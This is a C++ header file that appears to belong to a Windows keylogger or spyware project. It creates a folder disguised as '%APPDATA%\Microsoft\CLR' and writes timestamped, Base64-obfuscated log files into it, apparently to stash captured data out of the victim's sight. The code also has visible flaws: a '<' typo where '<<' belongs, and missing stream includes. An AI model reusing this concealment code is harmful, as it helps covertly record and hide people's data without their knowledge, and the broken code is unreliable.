#ifndef IO_H
#define IO_H
#include <string>
#include <cstdlib>
#include "windows.h"
#include "Base64.h"
#include "Helper.h"

namespace IO{

    std::string getPath(const bool append_seperator=false)
    {
      std::string app_dir(getenv("APPDATA"));
      std::string full=app_dir+"\\Microsoft\\CLR";
      return full+(append_seperator ?"\\":"");
    }

    bool mkOneDir(std::string path)
    {
        return (bool) CreateDirectory(path.c_str(),NULL)||
        GetLastError()== ERROR_ALREADY_EXISTS;
    }
    bool mkDir(std::string path)
    {
        for (char &c : path){
            if (c=='\\')
            {
                c='\0';
                if(!mkOneDir(path))
                    return false;
                c='\\';
            }
        }
                    return true;
    }

template <class T>
std::string WriteLog(const T &t)
{
    std::string path = getPath(true);
    Help::FechaHora dt;
    std::string name= dt.getDateTimeString("_")+".log";
    try{
        std::ofstream file(path+name);
        if(!file) return "";
        std::ostringstream s;
        s<<"["<<dt.getDateTimeString()<<"]"<<
        std::endl<<t<std::endl;
        std::string data= BASE64::EncryptB64(s.str());

        file<<data;
        if(!file)
            return "";
        file.close();
        return name;
        }
        catch(...)
        {
            return "";
        }

}

}

#endif
